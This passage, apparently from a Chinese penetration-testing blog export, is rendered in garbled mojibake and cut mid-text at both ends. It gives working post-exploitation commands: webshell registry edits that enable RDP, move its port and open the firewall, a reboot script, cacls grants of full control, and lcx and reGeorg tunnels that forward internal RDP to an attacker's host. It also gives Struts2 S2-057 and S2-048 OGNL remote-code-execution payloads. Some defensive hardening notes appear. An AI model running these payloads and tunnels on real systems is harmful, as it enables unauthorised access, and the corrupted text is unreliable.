224-254ä¿ç•™ç»™åœ¨è¿™å„¿æœªè®¨è®ºçš„ç‰¹æ®Šç±»ï¼ˆç»„æ’­å’Œå®éªŒï¼‰ã€‚ é€šè¿‡ä¸Šè¿°è®¨è®ºï¼Œå¯ä»¥çŸ¥é“åªæœ‰å¾ˆå°‘æ•°éå¸¸å¤§çš„ç»„ç»‡æ‰èƒ½æ‹¥æœ‰Aç±»åœ°å€ï¼Œå®é™…ä¸Šåªæœ‰126ä¸ªè¿™æ ·çš„ç»„ç»‡ï¼Œæˆ‘ä»¬ä¸­å¤§å¤šæ•°ç”¨çš„æ˜¯Bç±»å’ŒCç±»IPåœ°å€ä¸INTERNETç›¸è¿ã€‚ ğŸƒä¸€ã€é€šè¿‡webshellå¼€å¯33891.æŸ¥è¯¢ç»ˆç«¯ç«¯å£ xp&amp;2003ï¼šREG query HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminalâ€ â€œServer\\WinStations\\RDP-Tcp /v PortNumberé€šç”¨ï¼š 12regedit &#x2F;e tsp.reg &quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal server\\Wds\\rdpwd\\Tds\\tcp&quot;type tsp.reg 2.å¼€å¯XP&amp;2003ç»ˆç«¯æœåŠ¡ 1REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f 1REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f 3.æ›´æ”¹ç»ˆç«¯ç«¯å£ä¸º20008(0x4E28) 1REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal&quot; &quot;Server\\Wds\\rdpwd\\Tds\\tcp &#x2F;v PortNumber &#x2F;t REG_DWORD &#x2F;d 0x4E28 &#x2F;f 1REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal&quot; &quot;Server\\WinStations\\RDP-Tcp &#x2F;v PortNumber &#x2F;t REG_DWORD &#x2F;d 0x4E28 &#x2F;f 4.å–æ¶ˆxp&amp;2003ç³»ç»Ÿé˜²ç«å¢™å¯¹ç»ˆç«¯æœåŠ¡3389ç«¯å£çš„é™åˆ¶åŠIPè¿æ¥çš„é™åˆ¶ 1REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\GloballyOpenPorts\\List &#x2F;v 3389:TCP &#x2F;t REG_SZ &#x2F;d 3389:TCP:*:Enabled:@xpsp2res.dll,-22009 &#x2F;f 5.å¼€å¯Win2000çš„ç»ˆç«¯ï¼Œç«¯å£ä¸º3389(éœ€é‡å¯) 1234567891011121314151617181920echo Windows Registry Editor Version 5.00 &gt;2000.regecho. &gt;&gt;2000.regecho [HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\netcache] &gt;&gt;2000.regecho &quot;Enabled&quot;&#x3D;&quot;0&quot; &gt;&gt;2000.regecho [HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon] &gt;&gt;2000.regecho &quot;ShutdownWithoutLogon&quot;&#x3D;&quot;0&quot; &gt;&gt;2000.regecho [HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer] &gt;&gt;2000.regecho &quot;EnableAdminTSRemote&quot;&#x3D;dword:00000001 &gt;&gt;2000.regecho [HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server] &gt;&gt;2000.regecho &quot;TSEnabled&quot;&#x3D;dword:00000001 &gt;&gt;2000.regecho [HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\TermDD] &gt;&gt;2000.regecho &quot;Start&quot;&#x3D;dword:00000002 &gt;&gt;2000.regecho [HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\TermService] &gt;&gt;2000.regecho &quot;Start&quot;&#x3D;dword:00000002 &gt;&gt;2000.regecho [HKEY_USERS\\.DEFAULT\\Keyboard Layout\\Toggle] &gt;&gt;2000.regecho &quot;Hotkey&quot;&#x3D;&quot;1&quot; &gt;&gt;2000.regecho [HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Wds\\rdpwd\\Tds\\tcp] &gt;&gt;2000.regecho &quot;PortNumber&quot;&#x3D;dword:00000D3D &gt;&gt;2000.regecho [HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp] &gt;&gt;2000.regecho &quot;PortNumber&quot;&#x3D;dword:00000D3D &gt;&gt;2000.reg 6.å¼ºè¡Œé‡å¯Win2000&amp;Win2003ç³»ç»Ÿ(æ‰§è¡Œå®Œæœ€åä¸€æ¡ä¸€å¥åè‡ªåŠ¨é‡å¯) 12345@ECHO OFF &amp; cd&#x2F;d %temp% &amp; echo [version] &gt; restart.inf(set inf&#x3D;InstallHinfSection DefaultInstall)echo signature&#x3D;$chicago$ &gt;&gt; restart.infecho [defaultinstall] &gt;&gt; restart.infrundll32 setupapi,%inf% 1 %temp%\\restart.inf 7.ç¦ç”¨TCP/IPç«¯å£ç­›é€‰ (éœ€é‡å¯) 1REG ADD HKLM\\SYSTEM\\ControlSet001\\Services\\Tcpip\\parameters &#x2F;v EnableSecurityFilters &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f 8.ç»ˆç«¯è¶…å‡ºæœ€å¤§è¿æ¥æ•°æ—¶å¯ç”¨ä¸‹é¢çš„å‘½ä»¤æ¥è¿æ¥ 1mstsc &#x2F;v:ip:3389 &#x2F;console 9.è°ƒæ•´NTFSåˆ†åŒºæƒé™ 123456789101112131415161718192021222324252627282930313233cacls c: &#x2F;e &#x2F;t &#x2F;g everyone:F (æ‰€æœ‰äººå¯¹cç›˜éƒ½æœ‰ä¸€åˆ‡æƒåˆ©)cacls %systemroot%\\system32\\*.exe &#x2F;d everyone (æ‹’ç»æ‰€æœ‰äººè®¿é—®system32ä¸­exeæ–‡ä»¶)------------------------------------------------------3389.vbs cscript.exe------------------------------------------------------On Error Resume Nextconst HKEY_LOCAL_MACHINE &#x3D; &amp;H80000002strComputer &#x3D; &quot;.&quot;Set StdOut &#x3D; WScript.StdOutSet oReg&#x3D;GetObject(&quot;winmgmts:&#123;impersonationLevel&#x3D;impersonate&#125;!\\\\&quot; &amp;_strComputer &amp; &quot;\\root\\default:StdRegProv&quot;)strKeyPath &#x3D; &quot;SYSTEM\\CurrentControlSet\\Control\\Terminal Server&quot;oReg.CreateKey HKEY_LOCAL_MACHINE,strKeyPathstrKeyPath &#x3D; &quot;SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Wds\\rdpwd\\Tds\\tcp&quot;oReg.CreateKey HKEY_LOCAL_MACHINE,strKeyPathstrKeyPath &#x3D; &quot;SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp&quot;strKeyPath &#x3D; &quot;SYSTEM\\CurrentControlSet\\Control\\Terminal Server&quot;strValueName &#x3D; &quot;fDenyTSConnections&quot;dwValue &#x3D; 0oReg.SetDWORDValue HKEY_LOCAL_MACHINE,strKeyPath,strValueName,dwValuestrKeyPath &#x3D; &quot;SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Wds\\rdpwd\\Tds\\tcp&quot;strValueName &#x3D; &quot;PortNumber&quot;dwValue &#x3D; 3389oReg.SetDWORDValue HKEY_LOCAL_MACHINE,strKeyPath,strValueName,dwValuestrKeyPath &#x3D; &quot;SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp&quot;strValueName &#x3D; &quot;PortNumber&quot;dwValue &#x3D; 3389oReg.SetDWORDValue HKEY_LOCAL_MACHINE,strKeyPath,strValueName,dwValueSet R &#x3D; CreateObject(&quot;WScript.Shell&quot;)R.run(&quot;Shutdown.exe -r -t 0&quot;) é€šè¿‡3389å·¥å…·å¼€å¯è¿œç¨‹ç»ˆç«¯æœåŠ¡å™¨ç«¯å£è¢«ä¿®æ”¹å¦‚ä½•æŸ¥æ‰¾1ç›®å‰ä¸»è¦é€šè¿‡æ³¨å†Œè¡¨è¯»å–ã€ç«¯å£æ‰«æã€å‘½ä»¤æ¢é’ˆç­‰ä¸‰ç§æ–¹æ³•æŸ¥æ‰¾ä¿®æ”¹åçš„ç«¯å£ æœåŠ¡å™¨å¤„äºå†…ç½‘å¦‚ä½•è¿œç¨‹è¿æ¥1ã€æ‹¥æœ‰å…¬ç½‘ipçš„æ¡ä»¶ä¸‹1ã€é€šè¿‡lcxå·¥å…·è§£å†³å†…ç½‘è¿œç¨‹è¿æ¥ä¸Šä¼ ä¸€ä¸ªcmd.exeæ–‡ä»¶å’Œlckå·¥å…·ç„¶åsetp cmd.exeè®¾ç½®ç»ˆç«¯è·¯å¾„è§£å†³è¿è¡Œæƒé™é—®é¢˜ã€‚ Webshellä¸Šæ‰§è¡Œï¼šlcx.exe -slave è‡ªå·±çš„å…¬ç½‘ip 2222 127.0.0.1 3389 ï¼ˆå°†æœ¬æœº3389ç«¯å£æµé‡è½¬å‘åˆ°å…¬ç½‘ipçš„2222ç«¯å£ä¸Šå»ï¼‰ è‡ªå·±çš„ç”µè„‘é‡Œé¢æ‰§è¡Œï¼šlcx.exe -listen 2222 4444 ï¼ˆç›‘å¬æœ¬åœ°çš„2222ç«¯å£å°†æµé‡è½¬å‘åˆ°4444 ï¼‰ 2ã€æ²¡æœ‰å…¬ç½‘ipçš„æƒ…å†µä¸‹é€šè¿‡ç«¯å£è½¬å‘è„šæœ¬è§£å†³å†…ç½‘è¿œç¨‹è¿æ¥ åªèƒ½é€šè¿‡å†…ç½‘çš„webè¿›è¡Œè¿æ¥ä½¿ç”¨reDuhGUI_0.1å·¥å…·åˆ©ç”¨èœåˆ€å°†reDuh.phpè„šæœ¬ä¸Šä¼ åˆ°é¶æœºã€‚ç„¶ååŒå‡»ç‰©ç†æœºçš„reDuhGUI.exeè¿è¡Œè„šæœ¬å¦‚æœæœ‰å®‰å…¨ç‹—ä¼šè¢«æ‹¦æˆª å†…ç½‘æ¸—é€ï¼ˆå†…åˆ°å†…åˆ°å†…æ¸—é€ï¼‰å†…ç½‘æ¸—é€ä½¿ç”¨è¿™ä¸¤ä¸ªå·¥å…·â€“reGeorg+Proxifieré¦–å…ˆè¿›å…¥regeorgæ–‡ä»¶å°†tunnel.nosocket.phpä¸Šä¼ åˆ°é¶æœºwebæ ¹ç›®å½•æœ¬åœ°pythonè¿è¡Œ pip install urllib3ç¯å¢ƒä¸‹æ‰§è¡ŒcmdreGeorg-master[reGeorgSocksProxy.py](https://links.jianshu.com/go?to=http%3A%2F%2FreGeorgSocksProxy.py) -p 9999 -u http://192.168.60.118:8080/tunnel.nosocket.php","categories":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"æ¸—é€æµ‹è¯•","slug":"æ¸—é€æµ‹è¯•","permalink":"https://zhangyanlady.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"keywords":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"æ—æ³¨ã€ç›®å½•è¶Šæƒã€è·¨åº“ã€CDNç»•è¿‡","slug":"æ—æ³¨ã€ç›®å½•è¶Šæƒã€è·¨åº“ã€CDNç»•è¿‡","date":"2020-07-23T15:00:33.000Z","updated":"2020-09-20T08:56:49.131Z","comments":true,"path":"2020/07/23/æ—æ³¨ã€ç›®å½•è¶Šæƒã€è·¨åº“ã€CDNç»•è¿‡/","link":"","permalink":"https://zhangyanlady.github.io/2020/07/23/%E6%97%81%E6%B3%A8%E3%80%81%E7%9B%AE%E5%BD%95%E8%B6%8A%E6%9D%83%E3%80%81%E8%B7%A8%E5%BA%93%E3%80%81CDN%E7%BB%95%E8%BF%87/","excerpt":"","text":"æ€»ç»“å›¾ æ—æ³¨åŸç†ä¸»ç«™ä¸å­˜åœ¨æ¼æ´ï¼Œé€šè¿‡åŒæœåŠ¡å™¨çš„å…¶å®ƒç«™ç‚¹å­˜åœ¨çš„æ¼æ´ï¼Œè¿›è€Œè·å–æ•´ä¸ªæœåŠ¡å™¨ç½‘ç«™çš„æƒé™ï¼Œè¿›è¡Œæ§åˆ¶ã€‚ ipé€†å‘æŸ¥è¯¢å¯é€šè¿‡ping åŸŸåè·å–å…¶ç›¸å…³IPåœ°å€ï¼Œä¹‹åé€šè¿‡IPåœ°å€åæŸ¥è·å–å…¶æ—æ³¨çš„åŸŸåã€‚ ç›¸å…³ç½‘å€ï¼š http://tool.chinaz.com/Same/ http://dns.aizhan.com/ http://www.11best.com/ip/ ç›®å½•è¶Šæƒï¼šé€šè¿‡ä¸€ä¸ªç½‘ç«™çš„ç›®å½•è®¿é—®ç»Ÿä¸€æœåŠ¡å™¨ä¸‹çš„å…¶ä»–ç½‘ç«™çš„ç›®å½•ï¼Œä¸€ä¸ªç½‘ç«™è¢«æ”»é™·ï¼Œå…¨éƒ½è¢«æ”»é™· é˜²å¾¡æ–¹æ³•ï¼šæ¯ä¸ªç½‘ç«™åˆ›å»ºä¸€ä¸ªä¸åŒçš„è´¦å· 1ã€å»ºç«‹ä¸€ä¸ªè´¦å·testï¼Œé»˜è®¤åœ¨ users ç»„ 2ã€å°†ç½‘ç«™çš„èº«ä»½éªŒè¯å’Œè®¿é—®æ§åˆ¶çš„åŒ¿åè®¿é—®æ›´æ¢ä¸ºtest 3ã€å°†IUSRåˆ é™¤ï¼Œæ·»åŠ testç”¨æˆ·ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå°½é‡ä¸è¦åŒæ—¶ç»™è¯»å–è¿è¡Œå’Œå†™å…¥æƒé™ï¼Œè¯»å†™åˆ†ç¦»ã€‚ 4ã€å¦‚æœè¦ç»å¯¹çš„å®‰å…¨ï¼Œå¯ä»¥å°†Cç›˜çš„è®¿é—®æƒé™è®¾ç½®ä¸ºä»…ç®¡ç†å‘˜è®¿é—® è·¨åº“æŸ¥è¯¢ï¼šæ˜¯æŒ‡ç”±äºæƒé™è®¾ç½®ä¸ä¸¥æ ¼ï¼Œå¯¼è‡´æ™®é€šå¸å·è¢«æˆäºˆè¿‡é«˜çš„æƒé™ï¼Œä»è€Œä½¿å¾—å…¶å¯ä»¥å¯¹å…¶ä»–çš„æ•°æ®åº“è¿›è¡Œæ“ä½œã€‚æ¯”å¦‚ï¼Œåœ¨mysql**ä¸­ï¼Œinformatin_schema** è¿™ä¸ªè¡¨é»˜è®¤åªæœ‰root**æœ‰æƒé™è¿›è¡Œæ“ä½œã€‚ä½†æ˜¯å¦‚æœä¸€ä¸ªæ™®é€šè´¦æˆ·æƒé™è¿‡é«˜åï¼Œä»–ä¾¿å¯ä»¥å¯¹è¯¥æ•°æ®åº“è¿›è¡Œæ“ä½œï¼Œä»è€Œå½±å“æ•´ä¸ªmysql**æ•°æ®åº“çš„è¿è¡Œã€‚ sqlmapé‡Œé¢ä½¿ç”¨â€œâ€”current-ä»£è¡¨â€è¿›è¡Œåˆ¤æ–­å½“å‰åº“æ˜¯å“ªä¸ªã€‚Mysqlçš„rootã€mssqlçš„saã€oracleçš„sys åˆ†åˆ«æ˜¯å…¶æ•°æ®åº“ä¸­æƒé™æœ€å¤§çš„è´¦æˆ·ã€‚ cdnç»•è¿‡**1.**åˆ©ç”¨SecurityTrailså¹³å° 2. äºŒçº§åŸŸåæˆ–æ³›è§£æping **3.**nslookup **4.**https://dnsdb.io/zh-cn/ ###DNSæŸ¥è¯¢ https://x.threatbook.cn/ ###å¾®æ­¥åœ¨çº¿http://toolbar.netcraft.com/site_report?url= ###åœ¨çº¿åŸŸåä¿¡æ¯æŸ¥è¯¢http://viewdns.info/ ###DNSã€IPç­‰æŸ¥è¯¢ https://tools.ipip.net/cdn.php ###CDNæŸ¥è¯¢IP","categories":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"æ¸—é€æµ‹è¯•","slug":"æ¸—é€æµ‹è¯•","permalink":"https://zhangyanlady.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"keywords":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"struts2å®éªŒ","slug":"struts2å®éªŒ","date":"2020-07-12T14:48:45.000Z","updated":"2020-09-20T09:03:54.143Z","comments":true,"path":"2020/07/12/struts2å®éªŒ/","link":"","permalink":"https://zhangyanlady.github.io/2020/07/12/struts2%E5%AE%9E%E9%AA%8C/","excerpt":"","text":"Struts2 057å®éªŒå‚è€ƒï¼šhttps://blog.csdn.net/weixin_43625577/article/details/97111575 https://www.sinesafe.com/article/20180823/struts2057.html å—å½±å“çš„ç‰ˆæœ¬æ˜¯ApacheStruts 2.3â€“Apache Struts2.3.34ã€Apache Struts2.5â€“Apache Struts2.5.16ç­‰ç³»åˆ—ç‰ˆæœ¬ æ³¨æ„äº‹é¡¹ï¼š é¦–å…ˆåœ¨struts.xmlé…ç½®æ–‡ä»¶æ·»åŠ  å…¶æ¬¡ä¿®æ”¹é…ç½®æ–‡ä»¶struts-actionchaining.xml åˆ æ‰namespaceå±æ€§ï¼Œæˆ–ä½¿ç”¨äº†é€šé…ç¬¦* æœ€åæŠŠtype=â€chainâ€æ”¹æˆtype=â€redirectActionâ€ä¸¤ä¸ªæ–‡ä»¶éƒ½è¦æ”¹ 1234567æ”»å‡»payload: http:&#x2F;&#x2F;192.168.0.127:8080&#x2F;struts2-showcase&#x2F;$&#123;(1+1)&#125;&#x2F;actionChain1.action$&#123;#_memberAccess&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime().exec(&#39;calc.exe&#39;)&#125;$&#123;(#dm&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct&#x3D;#request[&#39;struts.valueStack&#39;].context).(#cr&#x3D;#ct[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ou&#x3D;#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#a&#x3D;@java.lang.Runtime@getRuntime().exec(&#39;id&#39;)).(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))&#125; Struts2 048å®éªŒå‚è€ƒï¼š https://www.ichunqiu.com/course/58753 ä½¿ç”¨æ–¹æ³•struts2_S2-048.py &lt;url&gt; &lt;cmd&gt; äºŒã€ å½±å“ç‰ˆæœ¬ï¼šStruts 2.3.x with Struts 1 plugin and Struts 1 action ä¸‰ã€ æ¼æ´ä»‹ç»ï¼šApache Struts 1æ’ä»¶çš„Apache Struts 2.3.Xç‰ˆæœ¬ä¸­å­˜åœ¨è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´,è¯¥æ¼æ´å‡ºç°äºStruts2çš„æŸä¸ªç±»ä¸­ï¼Œè¯¥ç±»æ˜¯ä¸ºäº†å°†Struts1ä¸­çš„ActionåŒ…è£…æˆä¸ºStruts2ä¸­çš„Actionï¼Œä»¥ä¿è¯Struts2çš„å…¼å®¹æ€§ã€‚åœ¨Struts2ä¸­çš„Struts1æ’ä»¶å¯ç”¨çš„æƒ…å†µä¸‹ï¼Œè¿œç¨‹æ”»å‡»è€…å¯é€šè¿‡ä½¿ç”¨æ¶æ„å­—æ®µå€¼ï¼Œæ„é€ ç‰¹å®šçš„è¾“å…¥ï¼Œå‘é€åˆ°ActionMessageç±»ä¸­ï¼Œä»è€Œå¯¼è‡´ä»»æ„å‘½ä»¤æ‰§è¡Œï¼Œè¿›è€Œè·å–ç›®æ ‡ä¸»æœºç³»ç»Ÿæƒé™ äº§ç”ŸåŸå› ï¼š è¿™ä¸ªæ¼æ´ä¸»è¦é—®é¢˜å‡ºåœ¨struts2-struts1-pluginè¿™ä¸ªæ’ä»¶åŒ…ä¸Šã€‚è¿™ä¸ªåº“çš„ä¸»è¦ä½œç”¨å°±æ˜¯å°†struts1çš„actionå°è£…æˆstruts2çš„actionä»¥ä¾¿å®ƒèƒ½åœ¨strut2ä¸Šè¿è¡Œä½¿ç”¨ã€‚ è€Œç”±äºstruts2-struts1-plugin åŒ…ä¸­çš„ â€œStruts1Action.javaâ€ ä¸­çš„ execute å‡½æ•°å¯ä»¥è°ƒç”¨ getText() å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°åˆšå¥½åˆèƒ½æ‰§è¡ŒOGNLè¡¨è¾¾å¼ï¼ŒåŒæ—¶è¿™ä¸ª getText() çš„ å‚æ•°è¾“å…¥ç‚¹ï¼Œåˆå¯ä»¥è¢«ç”¨æˆ·ç›´æ¥è¿›è¡Œæ§åˆ¶ï¼Œå¦‚æœè¿™ä¸ªç‚¹è¢«æ¶æ„æ”»å‡»è€…æ‰€æ§åˆ¶ï¼Œå°±å¯ä»¥æ„é€ æ¶æ„æ‰§è¡Œä»£ç ï¼Œä»è€Œå®ç°ä¸€ä¸ªRCEæ”»å‡»ã€‚ å››ã€ ç¯å¢ƒæ­å»ºï¼šå‚è€ƒç½‘å€ï¼š http://netsecurity.51cto.com/art/201707/544837.htm ä¸‹è½½/struts/2.3.24 ä¸‹è½½åœ°å€ï¼šhttp://archive.apache.org/dist/struts/2.3.24/ ç™¾åº¦äº‘é“¾æ¥ï¼šé“¾æ¥ï¼šhttp://pan.baidu.com/s/1dFeUyNvå¯†ç ï¼š279t ä¸‹è½½å®‰è£…xampp éƒ¨ç½²showcase è§£å‹ å¤åˆ¶åˆ° é‡å¯tomcat å·²æˆåŠŸè‡ªåŠ¨éƒ¨ç½² äº”ã€ æµ‹è¯•ç½‘å€ï¼šè®¿é—®http://127.0.0.1:8080/struts2-showcase/index.action è¿›å…¥http://127.0.0.1:8080/struts2-showcase/integration/editGangster.action ä»¥ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæ”»å‡»ç‚¹ï¼Œåœ¨å…¶æ‰§è¡ŒOGNLè¯­æ³•ï¼Œ${10-7}ï¼Œ æˆåŠŸæ‰§è¡Œ æŠ“åŒ… æ³¨æ„ç«¯å£ä¸è¦é‡å¤,å³ä¸è¦ä¸ä»¥ä¸‹é‡å¤ æˆ‘è¿™é‡Œç”¨çš„æ˜¯9090 æŠ“åŒ…è·å– ä¿®æ”¹Conten-Type:ä¸ºï¼ˆç²—ä½“éƒ¨åˆ†ä¸ºå‘½ä»¤ï¼‰ å…­ã€ POC: ${(#dm=@\\u006Fgnl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess=#dm).(#ef=â€™echo s2-048-EXISTSâ€™).(#iswin=(@\\u006Aava.lang.System@getProperty(â€˜os.nameâ€™).toLowerCase().contains(â€˜winâ€™))).(#efe=(#iswin?{â€˜cmd.exeâ€™,â€™/câ€™,#ef}:{â€˜/bin/bashâ€™,â€™-câ€™,#ef})).(#p=new \\u006Aava.lang.ProcessBuilder(#efe)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}â€, â€˜ageâ€™:â€™bbbâ€™, â€˜__checkbox_bustedBeforeâ€™:â€™trueâ€™, â€˜descriptionâ€™:â€™cccâ€™ è§†é¢‘é‡Œçš„payloadä¸º %{(#_=â€™multipart/form-dataâ€™).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[â€˜com.opensymphony.xwork2.ActionContext.containerâ€™]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=â€™whoamiâ€™).(#iswin=(@java.lang.System@getProperty(â€˜os.nameâ€™).toLowerCase().contains(â€˜winâ€™))).(#cmds=(#iswin?{â€˜cmd.exeâ€™,â€™/câ€™,#cmd}:{â€˜/bin/bashâ€™,â€™-câ€™,#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())} å³ ä¸ƒã€æ‰§è¡Œç»“æœ (@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))}","categories":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"æ¸—é€æµ‹è¯•","slug":"æ¸—é€æµ‹è¯•","permalink":"https://zhangyanlady.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"keywords":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"å¸¸è§ç«¯å£åŠå…¶æ¼æ´","slug":"å¸¸è§ç«¯å£åŠå…¶æ¼æ´","date":"2020-05-17T07:33:34.000Z","updated":"2020-09-20T08:54:33.643Z","comments":true,"path":"2020/05/17/å¸¸è§ç«¯å£åŠå…¶æ¼æ´/","link":"","permalink":"https://zhangyanlady.github.io/2020/05/17/%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3%E5%8F%8A%E5%85%B6%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"å¸¸è§ç«¯å£åŠå…¶æ¼æ´ https://www.cnblogs.com/lgf01010/articles/9610411.html 0x00 èƒŒæ™¯åœ¨å‰æ®µæ—¶é—´çš„æ¸—é€ä¸­ï¼Œæˆ‘å‘ç°é€šè¿‡ç«¯å£æ¥è¿›è¡Œæ¸—é€æœ‰æ—¶ä¼šæå‡æˆ‘ä»¬çš„æ•ˆç‡ï¼Œæ‰€ä»¥æ‰æœ‰äº†è¿™ç¯‡æ–‡ç« çš„è¯ç”Ÿï¼› é¦–å…ˆåˆ†äº«ä¸€ä»½å…³äºç«¯å£åŠä»–ä»¬å¯¹åº”çš„æœåŠ¡æ–‡ä»¶ï¼šhttps://yunpan.cn/cYyNXEpZNYvxQ è®¿é—®å¯†ç  983e è¿™é‡Œå†åˆ†äº«ä¸€ç¯‡æˆ‘æ›¾ç»åœ¨ç™¾åº¦æ–‡åº“æäº¤çš„ç«¯å£æ¸—é€æ–‡ç« ï¼šè¯·ç‚¹æˆ‘ å†æ¬¡çœ‹è¿™ç¯‡æ–‡ç« å‘ç°å†™çš„å¾ˆç®€å•ï¼Œä¹Ÿåªæè¿°äº†å‡ ä¸ªå¸¸è§çš„ç«¯å£æ¸—é€ï¼›è€Œä¸”ä¸€èˆ¬æˆ‘ä»¬éƒ½æ˜¯å¯ä»¥ä¿® æ”¹é»˜è®¤ç«¯å£çš„ï¼Œæ‰€ä»¥å¹³æ—¶åœ¨æ¸—é€è¿‡ç¨‹ä¸­ï¼Œå¯¹ç«¯å£ä¿¡æ¯çš„æ”¶é›†å°±æ˜¯ä¸€ä¸ªå¾ˆé‡è¦çš„è¿‡ç¨‹ï¼›ç„¶åå¯¹ç—‡ä¸‹è¯å°±å¯ä»¥æ›´å¿«çš„æ¸—é€è¿›å…¥æˆ‘ä»¬éœ€è¦çš„æœåŠ¡å™¨ï¼›æ¥ä¸‹æ¥å°±è¯¦ç»†é€šè¿‡æ¸—é€ å®æˆ˜å¯¹ç«¯å£çš„æ¸—é€è¿›è¡Œæ›´åŠ æ·±å…¥çš„å‰–æï¼› ç«¯å£æ¸—é€è¿‡ç¨‹ä¸­æˆ‘ä»¬éœ€è¦å…³æ³¨å‡ ä¸ªé—®é¢˜ï¼š 1ã€ ç«¯å£çš„bannerä¿¡æ¯ 2ã€ ç«¯å£ä¸Šè¿è¡Œçš„æœåŠ¡ 3ã€ å¸¸è§åº”ç”¨çš„é»˜è®¤ç«¯å£ å½“ç„¶å¯¹äºä¸Šé¢è¿™äº›ä¿¡æ¯çš„è·å–ï¼Œæˆ‘ä»¬æœ‰å„å¼å„æ 